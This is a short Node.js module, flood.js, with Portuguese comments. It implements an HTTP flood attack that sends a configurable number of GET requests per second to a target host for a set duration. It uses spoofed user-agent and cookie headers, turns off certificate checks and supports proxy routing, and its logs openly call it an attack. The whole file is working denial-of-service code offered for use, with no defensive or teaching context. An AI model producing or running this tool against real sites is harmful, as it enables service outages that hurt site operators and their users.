// flood.js
const axios = require('axios');
const https = require('https');

module.exports = async function flood(host, duration, rates, userAgent, cookies, headersall, proxy = null) {
  console.log(`[FLOOD] Iniciando ataque em ${host} por ${duration} segundos...`);
  console.log(`[FLOOD] Taxa: ${rates} req/s, User-Agent: ${userAgent}`);

  const endTime = Date.now() + duration * 1000;
  let requestsSent = 0;

  // Configuração do agente HTTPS para ignorar certificados
  const httpsAgent = new https.Agent({ rejectUnauthorized: false });

  // Headers base
  let headers = {
    'User-Agent': userAgent,
    'Cookie': cookies,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
  };

  // Mesclar headers extras se fornecidos
  if (headersall && typeof headersall === 'object') {
    Object.keys(headersall).forEach(key => {
      if (!headers[key]) headers[key] = headersall[key];
    });
  }

  // Configuração do proxy (se fornecido)
  let proxyConfig = null;
  if (proxy) {
    const [host, port] = proxy.split(':');
    proxyConfig = {
      host: host,
      port: parseInt(port),
      protocol: 'http'
    };
  }

  let intervalo = setInterval(async () => {
    if (Date.now() >= endTime) {
      clearInterval(intervalo);
      console.log(`[FLOOD] Ataque finalizado. Total de requisições: ${requestsSent}`);
      return;
    }

    for (let i = 0; i < rates; i++) {
      try {
        const response = await axios.get(host, {
          headers: headers,
          httpsAgent: httpsAgent,
          proxy: proxyConfig,
          timeout: 5000
        });
        requestsSent++;
        // Opcional: log de status a cada 100 requisições
        if (requestsSent % 100 === 0) {
          console.log(`[FLOOD] Requisições enviadas: ${requestsSent} | Status: ${response.status}`);
        }
      } catch (err) {
        // Ignora erros (esperado em ataque)
        requestsSent++;
      }
    }
  }, 1000); // a cada 1 segundo

  // Garantir que o intervalo seja interrompido no final
  setTimeout(() => {
    clearInterval(intervalo);
    console.log(`[FLOOD] Tempo esgotado. Total de requisições: ${requestsSent}`);
  }, duration * 1000 + 100);
};
